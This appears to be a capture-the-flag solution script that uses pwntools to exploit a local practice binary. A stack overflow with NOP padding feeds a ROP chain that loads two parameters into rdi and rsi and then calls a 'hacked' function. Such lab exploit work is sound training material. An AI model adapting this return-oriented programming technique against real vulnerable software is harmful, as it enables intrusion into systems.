#!/usr/bin/env python3

from pwn import *

exe = './ret2win_params'
elf = context.binary= ELF(exe,checksec=False)
context.log_level = 'debug'

io = process(exe)

padding =24
param1 = 0xdeadbeefdeadbeef
param2 = 0xc0debabec0debabe

pop_rdi = 0x000000000040124b
pop_rsi_r15 = 0x0000000000401249
ret = 0x0000000000401016
r15 = 0x0

payload = flat(
    asm('nop') * padding,
    ret, # for stack alignment
    pop_rdi,  # put param1 in rdi register
    param1,
    pop_rsi_r15, # param2 in rsi register
    param2,
    r15,
    elf.symbols.hacked,
    elf.symbols.main, ## return address for hacked() function
)

io.sendlineafter(b':',payload)
io.interactive()


